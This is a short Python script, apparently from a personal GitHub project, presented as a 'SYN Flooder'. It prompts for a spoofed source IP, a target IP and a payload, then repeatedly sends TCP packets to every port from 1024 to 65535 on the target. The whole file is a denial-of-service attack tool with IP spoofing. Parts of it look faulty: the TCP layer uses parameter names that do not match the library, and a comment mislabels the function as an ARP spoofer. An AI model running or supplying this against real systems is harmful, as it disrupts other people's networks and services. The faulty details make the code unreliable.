'''                                         '''

    ########################################
    #         SYN Flooder Script           #
    #       Ahmad Reza Parsi Zadeh         #
    #        github: ahmad-reza-ut         #
    ########################################


'''                                         '''

#------------- Syn Flooder -------------#
# Importing necessary libraries
from Imports import *

#------------------ Main ------------------#
def main():
    source = input("[+] Enter Fake Source IP Address: ")
    target = input("[+] Enter Target IP Address: ")
    message = input("[+] Enter the message for TCP payload: ")
    while(True):
        con = input()
        SYN_Flooder(source, target, message)
        if con == "f":
            exit(0)


#-------------- ARP Spoofer function --------------#
def SYN_Flooder(src, tgt, message):
    for dest_port in range(1024, 65535):
        ip_layer = IP(src = src, dst = tgt)
        tcp_layer = TCP(src_port = 4444, dest_port = dest_port)
        raw_layer = Raw(load = message)
        pkt = ip_layer/tcp_layer/raw_layer
        send(pkt)

# ----------------------------#
if __name__ == "__main__":
    main()

#---------------- END ----------------#